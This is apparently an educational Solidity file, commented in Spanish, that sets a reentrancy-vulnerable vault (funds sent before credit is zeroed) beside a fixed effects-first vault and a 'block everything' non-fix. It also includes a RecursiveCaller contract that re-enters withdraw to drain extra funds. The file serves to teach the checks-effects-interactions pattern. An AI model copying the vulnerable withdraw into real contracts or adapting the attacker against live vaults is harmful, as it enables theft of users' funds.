// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

// Ejemplos educativos acotados. Nunca desplegar en una red real.
abstract contract VaultBase {
    mapping(address => uint256) public credit;
    event Deposited(address indexed account, uint256 amount);
    event Withdrawn(address indexed account, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Deposito vacio");
        credit[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    function held() external view returns (uint256) { return address(this).balance; }
    function withdraw() external virtual;
}

contract BeforeEffectsVault is VaultBase {
    function withdraw() external override {
        uint256 amount = credit[msg.sender];
        require(amount > 0, "Sin credito");
        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "Envio fallido");
        credit[msg.sender] = 0;
        emit Withdrawn(msg.sender, amount);
    }
}

contract EffectsFirstVault is VaultBase {
    function withdraw() external override {
        uint256 amount = credit[msg.sender];
        require(amount > 0, "Sin credito");
        credit[msg.sender] = 0;
        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "Envio fallido");
        emit Withdrawn(msg.sender, amount);
    }
}

contract BlockAllVault is VaultBase {
    function withdraw() external pure override { revert("Bloquear todo no es reparar"); }
}

contract RecursiveCaller {
    VaultBase public immutable vault;
    address public immutable owner;
    uint256 public callbacks;

    constructor(address target) {
        vault = VaultBase(target);
        owner = msg.sender;
    }

    function attempt() external payable {
        require(msg.sender == owner, "Solo actor educativo");
        require(msg.value == 1 ether && callbacks == 0, "Intento de una unidad");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    function held() external view returns (uint256) { return address(this).balance; }

    receive() external payable {
        require(msg.sender == address(vault), "Solo vault");
        callbacks += 1;
        if (callbacks < 3) vault.withdraw();
    }
}
